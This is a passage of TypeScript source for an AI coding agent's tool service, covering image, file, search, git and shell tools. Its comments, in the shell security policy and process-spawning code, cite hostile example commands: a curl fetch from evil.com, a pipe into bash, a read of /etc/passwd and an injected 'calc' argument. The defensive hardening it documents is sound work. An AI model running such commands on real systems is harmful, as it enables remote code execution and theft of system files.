      space: metadata.space,
      channels: metadata.channels,
      depth: metadata.depth,
      hasAlpha: metadata.hasAlpha
    };
  }

  /**
   * `<dir>/<name>_<suffix><ext>` next to the source image, re-validated.
   * (String.replace(ext, …) hit the first occurrence of the extension
   * anywhere in the path — e.g. a `.png` directory — and broke when ext was ''.)
   */
  private deriveImageOutputPath(fullPath: string, suffix: string): string {
    const ext = path.extname(fullPath);
    const base = path.basename(fullPath, ext);
    return validatePath(path.join(path.dirname(fullPath), `${base}_${suffix}${ext || '.png'}`));
  }

  private async resizeImage(imagePath: string, width?: number, height?: number) {
    const fullPath = validatePath(imagePath);
    const outputPath = this.deriveImageOutputPath(fullPath, `resized_${Date.now()}`);
    await this.ensureApprovalForWrite(outputPath); // new output file
    
    await sharp(fullPath)
      .resize(width, height)
      .toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Image resized to ${width || 'auto'}x${height || 'auto'}`
    };
  }

  private async cropImage(imagePath: string, left: number, top: number, width: number, height: number) {
    const fullPath = validatePath(imagePath);
    const outputPath = this.deriveImageOutputPath(fullPath, `cropped_${Date.now()}`);
    await this.ensureApprovalForWrite(outputPath); // new output file
    
    await sharp(fullPath)
      .extract({ left, top, width, height })
      .toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Image cropped to ${width}x${height} at ${left},${top}`
    };
  }

  private async applyImageFilter(imagePath: string, filter: 'grayscale' | 'sepia' | 'blur' | 'sharpen') {
    // Validate before interpolating into the output filename — an arbitrary
    // string here could carry path separators / traversal.
    if (!IMAGE_FILTERS.has(filter)) {
      throw new Error(`apply_image_filter: unknown filter '${String(filter).slice(0, 30)}'. Use one of: ${[...IMAGE_FILTERS].join(', ')}`);
    }
    const fullPath = validatePath(imagePath);
    const outputPath = this.deriveImageOutputPath(fullPath, `filter_${filter}_${Date.now()}`);
    await this.ensureApprovalForWrite(outputPath); // new output file
    
    let transformer = sharp(fullPath);
    
    switch (filter) {
      case 'grayscale':
        transformer = transformer.grayscale();
        break;
      case 'blur':
        transformer = transformer.blur(5);
        break;
      case 'sharpen':
        transformer = transformer.sharpen();
        break;
      case 'sepia':
        // Sepia is typically done via color manipulation, sharp doesn't have a direct 'sepia' but we can use tint/recomb
        transformer = transformer.recomb([
          [0.393, 0.769, 0.189],
          [0.349, 0.686, 0.168],
          [0.272, 0.534, 0.131]
        ]);
        break;
    }
    
    await transformer.toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Applied ${filter} filter to image.`
    };
  }

  private async getUIText() {
    // In a real browser/electron context, this would scrape the DOM.
    // Here we simulate extracting the structural text of the active workspace.
    const projectStructure = await this.listFiles('.');
    return {
      active_workspace: "Solvent AI Agentic IDE",
      timestamp: new Date().toISOString(),
      structural_summary: projectStructure.map(f => `${f.type.toUpperCase()}: ${f.name}`).join('\n'),
      message: "Text-based UI structure extracted successfully."
    };
  }

  private async captureUI() {
    const uploadDir = path.join(PROJECT_ROOT, 'backend/uploads');

    // 1. Maintain Rolling Cache (Keep only last 3)
    try {
      const files = await fs.readdir(uploadDir);
      const captures = files
        .filter(f => f.startsWith('ui_capture_'))
        .map(f => ({ name: f, time: fs.stat(path.join(uploadDir, f)).then(s => s.mtimeMs) }));

      const resolvedCaptures = await Promise.all(captures.map(async c => ({ ...c, time: await c.time })));
      resolvedCaptures.sort((a, b) => b.time - a.time);

      if (resolvedCaptures.length >= 3) {
        const toDelete = resolvedCaptures.slice(2); // Keep current + 2 previous
        for (const file of toDelete) {
          await fs.unlink(path.join(uploadDir, file.name)).catch(e => logger.debug('[ToolService] Cache cleanup failed', e));
        }
      }
    } catch (e) {
      // If directory doesn't exist yet, it will be created below
    }

    const fileName = `ui_capture_${Date.now()}.png`;
    const filePath = path.join(uploadDir, fileName);
    await fs.mkdir(uploadDir, { recursive: true });

    try {
      if (process.platform === 'win32') {
        await captureScreenWindows(filePath);
      } else {
        await screenshot({ filename: filePath });
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      logger.error(`[ToolService] capture_ui screenshot failed: ${msg}`);
      return {
        error: `Screen capture failed: ${msg}. On Windows this usually means the system's native screenshot path is blocked by an antivirus or a missing System.Drawing assembly. Falling back to text-only context — use get_ui_text or fetch_preview_source instead.`,
      };
    }

    const base64 = await fs.readFile(filePath, 'base64');

    return {
      path: filePath,
      base64: `data:image/png;base64,${base64}`,
      message: "UI state captured. Rolling cache maintained (last 3 kept)."
    };
  }

  private getConsoleLogs(filter?: 'error' | 'warn' | 'log', limit?: number) {
    const state = getPreviewState();
    if (!state) {
      return {
        error: 'No preview context available. The agent must be running inside an /agent/chat request with previewState supplied by the frontend.',
        entries: [],
      };
    }
    const buffer = state.consoleBuffer ?? [];
    let filtered = buffer;
    if (filter) {
      filtered = buffer.filter(e => e.level === filter);
    }
    const cap = Math.max(1, Math.min(limit ?? 20, 200));
    const entries = filtered.slice(-cap).map(e => ({
      level: e.level,
      message: e.message.slice(0, 500),
      timestamp: e.timestamp,
    }));
    return {
      url: state.url ?? null,
      total: buffer.length,
      filtered: filtered.length,
      returned: entries.length,
      filter: filter ?? 'all',
      entries,
    };
  }

  private getSelectedElement() {
    const state = getPreviewState();
    if (!state) {
      return {
        error: 'No preview context available. The agent must be running inside an /agent/chat request with previewState supplied by the frontend.',
        element: null,
      };
    }
    if (!state.selectedElement) {
      return {
        element: null,
        note: 'User has not selected an element in the preview.',
      };
    }
    return {
      element: state.selectedElement,
    };
  }

  private async webSearch(query: string) {
    // Prefer Brave Search API, fall back to Serper
    const braveKey = process.env.BRAVE_SEARCH_API_KEY;
    if (braveKey) {
      const response = await axios.get('https://api.search.brave.com/res/v1/web/search', {
        params: { q: query, count: 20 },
        headers: { 'Accept': 'application/json', 'X-Subscription-Token': braveKey },
        timeout: 15_000,
        maxContentLength: 5 * 1024 * 1024,
      });
      return response.data;
    }

    const serperKey = process.env.SERPER_API_KEY;
    if (serperKey) {
      const response = await axios.post('https://google.serper.dev/search', { q: query }, {
        headers: { 'X-API-KEY': serperKey, 'Content-Type': 'application/json' },
        timeout: 15_000,
        maxContentLength: 5 * 1024 * 1024,
      });
      return response.data;
    }

    throw new Error("No search API key configured. Set BRAVE_SEARCH_API_KEY or SERPER_API_KEY.");
  }

  /**
   * Fetch the running app preview's HTML. Previews are almost always on
   * loopback (`http://localhost:5173`, the native sidecar on :3002), which the
   * SSRF guard in safeAxiosGet rejects — so loopback http(s) URLs are fetched
   * directly with redirects disabled, except the backend's own port (its API
   * and internal endpoints must not be reachable through the agent).
   * Everything else still goes through safeAxiosGet.
   */
  private async fetchPreviewSource(url: string): Promise<Record<string, unknown>> {
    if (typeof url !== 'string' || !/^https?:\/\//i.test(url)) {
      return { error: 'Invalid URL. Provide an http/https URL from the system prompt.' };
    }
    let parsed: URL;
    try {
      parsed = new URL(url);
    } catch {
      return { error: 'Invalid URL. Provide an http/https URL from the system prompt.' };
    }
    const host = parsed.hostname.toLowerCase();
    const isLoopback = host === 'localhost' || host === '127.0.0.1' || host === '[::1]' || host === '::1';
    const port = parsed.port ? Number(parsed.port) : parsed.protocol === 'https:' ? 443 : 80;
    const backendPort = Number(process.env.PORT || 3001);

    const opts = {
      timeout: 10_000,
      headers: { Accept: 'text/html' },
      responseType: 'text' as const,
      maxContentLength: 5 * 1024 * 1024,
    };
    try {
      let response;
      if (isLoopback) {
        if (port === backendPort) {
          return { error: `Cannot fetch the Solvent backend itself (port ${backendPort}). Use the app preview URL from the system prompt.` };
        }
        response = await axios.get(parsed.toString(), { ...opts, maxRedirects: 0, proxy: false });
      } else {
        response = await safeAxiosGet(url, { ...opts, maxHops: 5 });
      }
      const html = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
      return {
        url,
        html: html.length > 20_000 ? html.slice(0, 20_000) + '\n... (truncated)' : html,
        length: html.length,
      };
    } catch (err: unknown) {
      if (err instanceof UrlSafetyError) {
        return { error: 'Cannot fetch private/local addresses' };
      }
      const msg = err instanceof Error ? err.message : String(err);
      return { error: `Failed to fetch preview: ${msg}` };
    }
  }

  private async fetchWebContent(url: string) {
    const response = await safeAxiosGet(url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      responseType: 'text',
      maxHops: 5,
      timeout: 15_000,
      maxContentLength: 5 * 1024 * 1024,
    });
    // Return a slice to avoid token overflow. Guard non-string bodies — JSON
    // responses arrive as objects when axios sniffs the content type.
    const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    return body.slice(0, 10000);
  }

  private async readFile(filePath: string) {
    const fullPath = validatePath(filePath);
    const content = await fs.readFile(fullPath, 'utf-8');
    if (!isSensitivePath(fullPath)) {
      vectorService.addEntry(content.slice(0, 5000), { path: filePath, type: 'file_read' }).catch(err => logger.error(`[ToolService] addEntry (file_read) failed: ${err instanceof Error ? err.message : String(err)}`));
    }

    const MAX_FILE_CHARS = 8_000;
    if (content.length > MAX_FILE_CHARS) {
      return (
        content.slice(0, MAX_FILE_CHARS) +
        `\n\n[FILE TRUNCATED — ${content.length - MAX_FILE_CHARS} additional characters not shown. ` +
        `Use list_files to check the structure, or request a specific section of the file.]`
      );
    }
    return content;
  }

  private async writeFile(filePath: string, content: string) {
    const fullPath = validatePath(filePath);
    await fs.writeFile(fullPath, content);
    if (!isSensitivePath(fullPath)) {
      vectorService.addEntry(content.slice(0, 5000), { path: filePath, type: 'file_write' }).catch(err => logger.error(`[ToolService] addEntry (file_write) failed: ${err instanceof Error ? err.message : String(err)}`));
    }
    return { status: 'success', path: filePath };
  }

  private async listFiles(dirPath: string) {
    const fullPath = validatePath(dirPath);
    const files = await fs.readdir(fullPath, { withFileTypes: true });

    const MAX_ENTRIES = 150;
    const visible = files.slice(0, MAX_ENTRIES);
    const result = visible.map(f => ({
      name: f.name,
      type: f.isDirectory() ? 'directory' : 'file',
    }));
    if (files.length > MAX_ENTRIES) {
      result.push({
        name: `[${files.length - MAX_ENTRIES} more entries — use a subdirectory path to narrow results]`,
        type: 'file',
      });
    }
    return result;
  }

  private async getFileOutline(filePath: string): Promise<string> {
    const fullPath = validatePath(filePath);
    const content = await fs.readFile(fullPath, 'utf-8');
    const lines = content.split('\n');
    const outline: string[] = [];

    lines.forEach((line, idx) => {
      if (
        /^export\s+(?:default\s+)?(?:async\s+)?(?:function|class|const|let|var|type|interface|enum)\s+\w+/.test(line) ||
        /^(?:async\s+)?function\s+\w+/.test(line) ||
        /^class\s+\w+/.test(line)
      ) {
        outline.push(`${idx + 1}: ${line.trimEnd()}`);
      }
    });

    return outline.length > 0
      ? outline.join('\n')
      : `(no top-level exported symbols found in ${filePath})`;
  }

  private async grepFiles(
    pattern: string,
    searchPath?: string,
    include?: string,
    opts?: { literal?: boolean }
  ): Promise<string> {
    const effectiveRoot = getEffectiveProjectRoot();
    const basePath = searchPath ? validatePath(searchPath) : effectiveRoot;
    const includeGlob = include || '*.{ts,tsx,js,jsx,css,json,md}';
    const pathSep = process.platform === 'win32' ? '\\' : '/';
    const literal = opts?.literal === true;

    // Expand brace expressions (e.g. "*.{ts,tsx}") into multiple --include flags,
    // because spawn does not invoke a shell so brace expansion never happens.
    const includeArgs: string[] = [];
    const braceMatch = includeGlob.match(/^(.*)\{([^}]+)\}(.*)$/);
    if (braceMatch) {
      const [, prefix, inner, suffix] = braceMatch;
      (inner ?? '').split(',').forEach((ext) => {
        includeArgs.push(`--include=${prefix ?? ''}${ext}${suffix ?? ''}`);
      });
    } else {
      includeArgs.push(`--include=${includeGlob}`);
    }

    // On Windows, use findstr as fallback if grep is unavailable
    let bin: string;
    let binArgs: string[];
    if (process.platform === 'win32') {
      bin = 'findstr';
      // `/c:` makes the whole pattern one search string — without it findstr
      // splits on spaces into OR'd words, and a leading `/` reads as an option.
      binArgs = ['/s', '/n', literal ? '/l' : '/r', `/c:${pattern}`, ...this.expandGlobForFindstr(includeGlob, basePath)];
    } else {
      bin = 'grep';
      binArgs = [
        '-rn', ...(literal ? ['-F'] : []), ...includeArgs,
        ...GREP_EXCLUDED_DIRS.map(d => `--exclude-dir=${d}`),
        '--', pattern, basePath,
      ];
    }

    return new Promise((resolve) => {
      const proc = spawn(bin, binArgs, {
        cwd: effectiveRoot,
        windowsHide: true,
      });

      let output = '';
      let settled = false;
      const MAX_OUTPUT = 1024 * 1024;
      const finish = (text: string) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        resolve(text);
      };
      const format = (): string => {
        // findstr can't exclude directories — drop node_modules/.git/etc. here.
        const lines = output.trim().split(/\r?\n/).filter(l => l && !isInExcludedDir(l));
        if (lines.length === 0) return `No matches found for "${pattern}"`;
        const relativized = lines.slice(0, 30).map((l) => l.replace(effectiveRoot + pathSep, ''));
        const suffix = lines.length > 30 ? '\n... (results truncated at 30)' : '';
        return relativized.join('\n') + suffix;
      };
      const timer = setTimeout(() => {
        proc.kill();
        finish(output.trim() ? format() : 'Search timed out');
      }, 10_000);
      proc.stdout.on('data', (d: Buffer) => { if (output.length < MAX_OUTPUT) output += d.toString(); });
      proc.stderr.on('data', () => { /* drain — findstr/grep warn about unreadable files */ });
      proc.on('close', () => finish(format()));
      proc.on('error', () => finish(`No matches found for "${pattern}"`));
    });
  }

  private expandGlobForFindstr(glob: string, basePath: string): string[] {
    const extensions: string[] = [];
    const braceMatch = glob.match(/^(.*)\{([^}]+)\}(.*)$/);
    if (braceMatch) {
      const [, prefix, inner, suffix] = braceMatch;
      (inner ?? '').split(',').forEach((ext) => {
        extensions.push(path.join(basePath, `${prefix ?? ''}${ext}${suffix ?? ''}`));
      });
    } else {
      extensions.push(path.join(basePath, glob));
    }
    return extensions;
  }

  private async editFile(filePath: string, oldContent: string, newContent: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    const fileContent = await fs.readFile(fullPath, 'utf-8');
    const occurrences = fileContent.split(oldContent).length - 1;

    if (occurrences === 0) {
      throw new Error(
        `edit_file: Could not find the specified old_content in ${filePath}. ` +
        `The text may have changed or there may be whitespace differences. ` +
        `Use read_file to verify the current content before retrying.`
      );
    }
    if (occurrences > 1) {
      throw new Error(
        `edit_file: old_content appears ${occurrences} times in ${filePath}. ` +
        `Provide more surrounding context to make it unique.`
      );
    }

    // Function replacer: a string replacement would interpret `$&`, `$$`,
    // `` $` `` and `$'` inside the new code and corrupt the file.
    const updated = fileContent.replace(oldContent, () => newContent);
    await fs.writeFile(fullPath, updated, 'utf-8');
    return { status: 'success', path: filePath };
  }

  private async createFile(filePath: string, content: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    try {
      await fs.access(fullPath);
      throw new Error(`create_file: ${filePath} already exists. Use write_file to overwrite or edit_file to modify it.`);
    } catch (e: unknown) {
      if ((e as NodeJS.ErrnoException).code !== 'ENOENT') throw e;
    }
    await fs.mkdir(path.dirname(fullPath), { recursive: true });
    await fs.writeFile(fullPath, content, 'utf-8');
    return { status: 'success', path: filePath };
  }

  private async deleteFile(filePath: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    await fs.unlink(fullPath);
    return { status: 'success', path: filePath };
  }

  private async moveFile(from: string, to: string): Promise<{ status: string; from: string; to: string }> {
    const fromPath = validatePath(from);
    const toPath = validatePath(to);
    await fs.mkdir(path.dirname(toPath), { recursive: true });
    await fs.rename(fromPath, toPath);
    return { status: 'success', from, to };
  }

  private async replaceInFiles(
    pattern: string,
    replacement: string,
    glob?: string,
    searchPath?: string
  ): Promise<{ status: string; filesModified: number; files: string[]; truncated?: boolean }> {
    if (typeof pattern !== 'string' || pattern.length === 0) throw new Error('replace_in_files requires a non-empty pattern');
    if (typeof replacement !== 'string') throw new Error('replace_in_files requires a replacement string');

    // Walk the tree directly instead of parsing grep output: grep_files caps
    // at 30 lines (silently skipping files) and its `file:line:` output split
    // on ':' broke on Windows drive letters (`C:\...`).
    const effectiveRoot = getEffectiveProjectRoot();
    const basePath = validatePath(searchPath || '.');
    const matcher = globToBasenameRegex(glob || '*.{ts,tsx,js,jsx,css,json}');
    const MAX_FILES_SCANNED = 20_000;
    const MAX_FILE_BYTES = 2 * 1024 * 1024;
    const excluded = new Set(GREP_EXCLUDED_DIRS);

    const modified: string[] = [];
    let scanned = 0;
    let truncated = false;
    const stack: string[] = [basePath];
    while (stack.length > 0) {
      const dir = stack.pop()!;
      let entries: import('fs').Dirent[];
      try {
        entries = await fs.readdir(dir, { withFileTypes: true });
      } catch {
        continue;
      }
      for (const entry of entries) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) {
          if (!excluded.has(entry.name)) stack.push(full);
          continue;
        }
        if (!entry.isFile() || !matcher.test(entry.name)) continue;
        if (isSensitivePath(full)) continue;
        if (++scanned > MAX_FILES_SCANNED) { truncated = true; break; }
        try {
          const stat = await fs.stat(full);
          if (stat.size > MAX_FILE_BYTES) continue;
          const content = await fs.readFile(full, 'utf-8');
          if (content.slice(0, 8192).includes('\0')) continue; // binary
          if (!content.includes(pattern)) continue;
          const updated = content.split(pattern).join(replacement);
          if (updated !== content) {
            await fs.writeFile(full, updated, 'utf-8');
            modified.push(path.relative(effectiveRoot, full).split(path.sep).join('/'));
          }
        } catch {
          // skip unreadable files
        }
      }
      if (truncated) break;
    }

    return {
      status: modified.length > 0 ? 'success' : 'no_matches',
      filesModified: modified.length,
      files: modified,
      ...(truncated ? { truncated: true } : {}),
    };
  }

  private spawnProcess(
    bin: string,
    args: string[],
    options: { cwd?: string; timeoutMs?: number }
  ): Promise<{ stdout: string; exitCode: number }> {
    // Never hand argv to a shell: on Windows `shell: true` joins args with
    // spaces into a cmd.exe command line, so `git commit -m "a & calc"` ran
    // calc. Native executables (git, node, python) are spawned directly.
    // npm/npx/etc. are .cmd shims that Windows can only run through cmd.exe,
    // so those go through `cmd.exe /d /s /c` only after every argument has
    // passed a strict charset check that leaves cmd nothing to interpret.
    let executable = bin;
    let spawnArgs = args;
    let verbatim = false;
    if (process.platform === 'win32' && !WINDOWS_NATIVE_EXES.has(commandBaseName(bin))) {
      for (const a of [bin, ...args]) {
        if (!CMD_SAFE_ARG.test(a)) {
          return Promise.resolve({
            stdout: `Rejected argument '${a.slice(0, 60)}': on Windows, arguments to ${bin} may only contain letters, digits and _ - . / \\ : @ = + , ~ * (no spaces, quotes or shell metacharacters).`,
            exitCode: 1,
          });
        }
      }
      executable = process.env.ComSpec || 'cmd.exe';
      spawnArgs = ['/d', '/s', '/c', `"${[bin, ...args].join(' ')}"`];
      verbatim = true;
    }

    return new Promise((resolve) => {
      let proc: ReturnType<typeof spawn>;
      try {
        proc = spawn(executable, spawnArgs, {
          cwd: options.cwd ?? getEffectiveProjectRoot(),
          shell: false,
          windowsHide: true,
          windowsVerbatimArguments: verbatim,
        });
      } catch (e: unknown) {
        resolve({ stdout: e instanceof Error ? e.message : String(e), exitCode: 1 });
        return;
      }
      let stdout = '';
      let resolved = false;
      const ms = options.timeoutMs ?? 30_000;
      const timer = setTimeout(() => {
        killProcessTree(proc);
        done({ stdout: stdout + '\n[TIMED OUT]', exitCode: 1 });
      }, ms);
      const done = (result: { stdout: string; exitCode: number }) => {
        clearTimeout(timer);
        if (!resolved) { resolved = true; resolve(result); }
      };
      const MAX = 1024 * 1024;
      const append = (d: Buffer) => { if (stdout.length < MAX) stdout += d.toString(); };
      proc.stdout?.on('data', append);
      proc.stderr?.on('data', append);
      proc.on('close', (code) => done({ stdout, exitCode: code ?? 0 }));
      proc.on('error', (e: Error) => done({ stdout: e.message, exitCode: 1 }));
    });
  }

  private async runTests(command?: string, cwd?: string): Promise<{ stdout: string; exitCode: number }> {
    const effectiveRoot = getEffectiveProjectRoot();
    // validatePath: a relative cwd like "../../" must not escape the project.
    const workDir = cwd ? validatePath(cwd) : effectiveRoot;
    const cmd = command || 'npx tsc --noEmit --pretty false';
    // run_tests must pass the same security policy as run_shell or it
    // becomes an allowlist bypass.
    if (process.env.SOLVENT_ALLOW_SHELL !== 'true') {
      this.assertCommandAllowed(cmd);
    }
    // spawnProcess never uses a shell, so pipelines/redirects can't work here.
    let lexedTest: ReturnType<typeof lexShellCommand>;
    try {
      lexedTest = lexShellCommand(cmd, 'posix');
    } catch (err: unknown) {
      throw new Error(`run_tests: ${err instanceof Error ? err.message : String(err)}`);
    }
    if (lexedTest.stages.length !== 1 || lexedTest.stages[0]!.redirects.length > 0) {
      throw new Error('run_tests: pipelines, chains and redirects are not supported — pass a single command (use run_shell for pipelines).');
    }
    const parts = lexedTest.stages[0]!.words.map(w => w.text);
    const bin = parts[0] ?? 'npx';
    const binArgs = parts.slice(1);
    const { stdout, exitCode } = await this.spawnProcess(bin, binArgs, { cwd: workDir, timeoutMs: 30_000 });
    return { stdout: stdout.slice(0, 4096), exitCode };
  }

  private async getErrors(cwd?: string): Promise<{ errors: Array<{ file: string; line: number; col: number; message: string }>; count: number }> {
    const { stdout } = await this.runTests(undefined, cwd);
    const errorRegex = /^(.+\.tsx?)\((\d+),(\d+)\):\s+error\s+TS\d+:\s+(.+)$/gm;
    const errors: Array<{ file: string; line: number; col: number; message: string }> = [];
    let match: RegExpExecArray | null;
    while ((match = errorRegex.exec(stdout)) !== null && errors.length < 50) {
      const file = match[1] ?? '';
      const line = parseInt(match[2] ?? '0', 10);
      const col = parseInt(match[3] ?? '0', 10);
      const message = match[4] ?? '';
      errors.push({ file, line, col, message });
    }
    return { errors, count: errors.length };
  }

  private async installPackage(packages: string[], cwd?: string): Promise<{ status: string; packages: string[] }> {
    const effectiveRoot = getEffectiveProjectRoot();
    const workDir = cwd ? validatePath(cwd) : effectiveRoot;
    // Package args reach npm.cmd (via cmd.exe) on Windows — restrict to the
    // npm name charset plus a plain version/tag, with no `< > ^ = *` (cmd
    // redirection/escape characters), and reject flag injection (leading '-').
    const SAFE_PACKAGE = /^(@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*(@[a-zA-Z0-9._~+-]+)?$/;
    if (!Array.isArray(packages) || packages.length === 0) {
      throw new Error('install_package: packages must be a non-empty array');
    }
    for (const pkg of packages) {
      if (typeof pkg !== 'string' || pkg.startsWith('-') || !SAFE_PACKAGE.test(pkg)) {
        throw new Error(`install_package: invalid package name '${String(pkg).slice(0, 60)}'`);
      }
    }
    const { exitCode, stdout } = await this.spawnProcess('npm', ['install', ...packages], { cwd: workDir, timeoutMs: 120_000 });
    if (exitCode !== 0) throw new Error(`npm install failed: ${stdout.slice(0, 500)}`);
    return { status: 'success', packages };
  }

  private async gitStatus(): Promise<string> {
    const { stdout } = await this.spawnProcess('git', ['status', '--short'], {});
    return stdout.trim() || '(working tree clean)';
  }

  private async gitDiff(file?: string): Promise<string> {
    // validatePath: the file must stay inside the project root.
    const args = file ? ['diff', '--', validatePath(file)] : ['diff'];
    const { stdout } = await this.spawnProcess('git', args, {});
    return stdout.length > 8000 ? stdout.slice(0, 8000) + '\n... (diff truncated)' : stdout || '(no changes)';
  }

  private async gitCommitAll(message: string): Promise<{ status: string; message: string }> {
    if (typeof message !== 'string' || !message.trim()) throw new Error('git_commit requires a non-empty message');
    await this.spawnProcess('git', ['add', '-A'], {});
    const { exitCode, stdout } = await this.spawnProcess('git', ['commit', '-m', message], {});
    if (exitCode !== 0) throw new Error(`git commit failed: ${stdout.slice(0, 300)}`);
    return { status: 'success', message };
  }

  private async getProjectInfo(projectPath?: string): Promise<Record<string, unknown>> {
    const effectiveRoot = getEffectiveProjectRoot();
    const basePath = projectPath ? validatePath(projectPath) : effectiveRoot;
    try {
      const pkg = JSON.parse(await fs.readFile(path.join(basePath, 'package.json'), 'utf-8')) as {
        name?: string; version?: string; scripts?: Record<string, string>;
        dependencies?: Record<string, string>; devDependencies?: Record<string, string>;
      };
      const allDeps = { ...pkg.dependencies, ...pkg.devDependencies };
      const framework =
        allDeps.next ? 'Next.js' : allDeps['@remix-run/react'] ? 'Remix' :
        allDeps.react ? 'React' : allDeps.vue ? 'Vue' : allDeps.svelte ? 'Svelte' :
        allDeps.express ? 'Express' : allDeps.fastify ? 'Fastify' : 'Node.js';
      return {
        name: pkg.name, version: pkg.version, framework,
        scripts: pkg.scripts ?? {},
        dependencies: Object.keys(pkg.dependencies ?? {}),
        devDependencies: Object.keys(pkg.devDependencies ?? {}),
      };
    } catch {
      return { error: `No package.json found at ${projectPath ?? 'project root'}` };
    }
  }

  /**
   * Validate a command against the security policy: command-substitution
   * rejection, dangerous-pattern denylist, and per-stage allowlist + argv
   * checks. Shared by run_shell and run_tests so neither path can bypass the
   * policy. Callers gate on SOLVENT_ALLOW_SHELL themselves where opt-out is
   * intended.
   */
  private assertCommandAllowed(command: string): void {
    const normalizedCommand = command.trim().toLowerCase();

    // Reject command substitution — it hides commands from the allowlist.
    if (hasCommandSubstitution(command)) {
      throw new Error(
        `Command rejected by security policy: command substitution ($() or backticks) is not permitted.`
      );
    }

    // First, check for dangerous commands (always blocked)
    DANGEROUS_COMMANDS.forEach((dangerous, i) => {
      if (DANGEROUS_COMMAND_RES[i]!.test(normalizedCommand)) {
        throw new Error(
          `Command rejected by security policy: Contains dangerous pattern '${dangerous}'. Set SOLVENT_ALLOW_SHELL=true to enable arbitrary command execution (not recommended).`
        );
      }
    });

    // Lex the command the way the routed shell will see it: quote-aware
    // stage splitting, glued redirects, escape/quote removal, and expansion
    // flags. Syntax we can't model safely (unclosed quotes, heredocs,
    // process substitution, subshell parens) is rejected outright.
    const dialect: ShellDialect = currentShellDialect();
    let stages: ShellStage[];
    try {
      stages = lexShellCommand(command, dialect).stages;
    } catch (err: unknown) {
      if (err instanceof ShellSyntaxError) {
        throw new Error(`Command rejected by security policy: ${err.message}`);
      }
      throw err;
    }

    // Validate every pipeline stage's first token against the allowlist, and
    // track a simulated cwd across chained stages so `cd` can't be used to
    // walk the *real* shell's cwd outside the project root before a later
    // stage reads/writes relative to it (e.g. `cd .. && cat ../../secret`).
    // Every stage's own arguments and redirect targets are also resolved
    // against that simulated cwd and rejected if they'd escape the root,
    // which also blocks single-stage traversal with no `cd` at all
    // (e.g. `cat ../../../etc/passwd`).
    let simulatedCwd = getEffectiveProjectRoot();
    for (const stage of stages) {
      const stageText = stage.raw;
      const stageLower = stageText.toLowerCase();
      const allowed = ALLOWED_COMMAND_PREFIXES.some(prefix =>
        stageLower.startsWith(prefix.toLowerCase()) || stageLower === prefix.trim().toLowerCase()
      );
      if (!allowed || stage.words.length === 0) {
        throw new Error(
          `Command rejected by security policy: pipeline stage '${stageText.substring(0, 50)}${stageText.length > 50 ? '...' : ''}' is not in the allowlist. Allowed commands: ${ALLOWED_COMMAND_PREFIXES.join(', ')}.`
        );
      }
      const argv = stage.words.map(w => w.text);
      rejectDangerousArgv(argv);

      if (argv[0]!.toLowerCase() === 'cd') {
        // cmd.exe's `cd /d <path>` switches drive as well — the path is the next word.
        const argWords = stage.words.slice(1).filter(w => !(dialect === 'cmd' && w.text.toLowerCase() === '/d'));
        const argWord = argWords[0];
        // Bare `cd`, `cd -`, and `cd ~` all resolve via $HOME/$OLDPWD in a
        // real shell — none of which we control or can validate here — so
        // they're rejected outright rather than risking an untracked escape.
        if (!argWord || argWord.text === '-' || argWord.expands || argWords.length > 1) {
          throw new Error(
            `Command rejected by security policy: 'cd' must take exactly one explicit path (no bare 'cd', '-', '~' or $VAR) — it may resolve outside the project root.`
          );
        }
        const resolved = path.resolve(simulatedCwd, argWord.text);
        if (!isPathWithinRoot(resolved)) {
          throw new Error(
            `Command rejected by security policy: 'cd ${argWord.text}' would move outside the permitted project root.`
          );
        }
        simulatedCwd = resolved;
        continue;
      }

      assertStageArgsWithinRoot(stage, simulatedCwd);
    }
  }

  /**
   * Executes a shell command with security restrictions.
   *
   * Security measures:
   * 1. Uses explicit allowlist of permitted command prefixes (not a denylist)
   * 2. Blocks dangerous commands (rm -rf, mkfs, dd, sudo, etc.)
   * 3. Uses spawn with argument array (shell: false) to prevent shell interpolation
   * 4. Sets NO_COLOR=1 environment variable
   * 5. Restricts working directory to PROJECT_ROOT
   *
   * Known limitations:
   * - The allowlist is prefix-based. A command like `curl http://evil.com/payload`
   *   passes the `curl ` prefix check. The DANGEROUS_COMMANDS list mitigates the
   *   most common pipe-based exfiltration patterns (e.g. `curl | bash`), but is
   *   not exhaustive. Set SOLVENT_ALLOW_SHELL=false in production to disable shell
   *   execution entirely if the feature is not needed.
   * - Arguments are lexed with shell quoting rules (utils/shellLexer.ts), but
   *   only a subset of shell syntax is modelled; anything outside it (heredocs,
   *   subshells, process substitution, $VAR/~ expansion) is rejected.
   */
  private async runShell(command: string): Promise<{ stdout: string; stderr: string }> {
    // Check if arbitrary shell execution is explicitly enabled
    const allowArbitraryShell = process.env.SOLVENT_ALLOW_SHELL === 'true';

    // Reject long-running dev-server commands — they never exit and would
    // hang the tool loop. The agent should use ide_run_in_sandbox (WebContainer)
    // for dev servers, not the backend shell.
    //
    // IMPORTANT: only match when the dev-server name is the *command being
    // invoked*, not when it appears inside an argument path. `ls
    // node_modules/.bin/vite` must be allowed, otherwise the agent cannot
    // verify that ghost `npm install` runs actually produced the binary.
    // We split on pipeline operators and check each stage's leading token.
    const stages = splitPipelineStages(command);
    const devServerStagePatterns = [
      /^npm(?:\.cmd)?\s+(?:run\s+)?(?:dev|start|serve|watch|preview)\b/i,
      /^yarn(?:\.cmd)?\s+(?:dev|start|serve|watch|preview)\b/i,
      /^pnpm(?:\.cmd)?\s+(?:run\s+)?(?:dev|start|serve|watch|preview)\b/i,
      // `vite` / `vite --host` / `./node_modules/.bin/vite` — but NOT
